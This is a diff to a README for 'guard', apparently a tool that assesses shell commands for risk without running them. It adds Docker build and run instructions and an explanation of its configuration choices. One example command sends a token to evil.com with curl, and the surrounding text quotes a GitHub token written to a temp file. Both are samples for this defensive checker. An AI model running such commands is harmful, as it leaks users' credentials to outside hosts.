@@ -562,6 +562,58 @@ What survives is what should: `curl -s -H "Authorization: Bearer $(gh auth
 token)"` as intended use, and `gh auth token > /tmp/ght.txt` as a credential
 written to disk.
 
+## Docker
+
+```bash
+make docker          # multi-arch (linux/amd64, linux/arm64) -> ./guard-oci.tar
+make docker-local    # this machine only, loaded and ready to run
+
+docker run --rm -p 8080:8080 guard:dev
+docker run --rm guard:dev assess 'curl -d "$TOKEN" https://evil.com'
+```
+
+The image is `distroless/static` running as nonroot, about 9 MB. No shell, no
+package manager, nothing but the binary and the config — fitting for a tool
+whose whole claim is that it never executes anything, since there is nothing
+in there for it to execute.
+
+Started with no arguments it serves on `:8080`; give it arguments and they
+replace that, so any subcommand works:
+
+```
+docker run guard:dev                                      serve --addr :8080
+docker run guard:dev assess 'curl ...'                    exit 0 or 1
+docker run guard:dev config check                         validate the base
+```
+
+The knowledge base ships at **`/etc/guard/knowledge.yaml`**, and is pointed at
+by `GUARD_KB` rather than by a flag in `CMD`. That distinction is load-bearing:
+explicit arguments replace `CMD` wholesale, so a `--kb` baked into `CMD` would
+apply to the default command and *silently not* to
+`docker run guard config check`. As an environment default it applies to
+every subcommand, and `--kb` still overrides it.
+
+So mounting your own policy works everywhere:
+
+```bash
+docker run --rm -v ./my-knowledge.yaml:/etc/guard/knowledge.yaml:ro \
+  -p 8080:8080 guard:dev
+```
+
+`GET /v1/knowledge` then names the file it loaded, so which policy is running
+is never in doubt.
+
+Two notes on the build. It cross-compiles from the build platform rather than
+emulating the target, so two architectures cost roughly one architecture's
+time. And `make docker` writes an OCI archive rather than loading the image,
+because a manifest list cannot go into the classic docker image store — set
+`DOCKER_OUTPUT=--push` to publish to a registry instead.
+
+The container binds `:8080` rather than the CLI's loopback default: inside a
+container loopback is unreachable from outside it, and the network namespace
+is the boundary that loopback provides on a host. It is still unauthenticated
+— do not publish the port anywhere you would not publish a shell.
+
 ## HTTP API
 
 ```bash
@@ -775,6 +827,7 @@ it knows about specific programs arrives through one package's exported types.
 
 | other | |
 |---|---|
-| `Makefile` | build, test, coverage, benchmarks, vet |
+| `Makefile` | build, test, coverage, benchmarks, vet, docker |
+| `Dockerfile` | multi-arch distroless image |
 | `probes/` | the parser comparison, reproducible via `run.sh` |
 | `pkg/*/[a-z]*_test.go` | tests live beside the package they exercise |
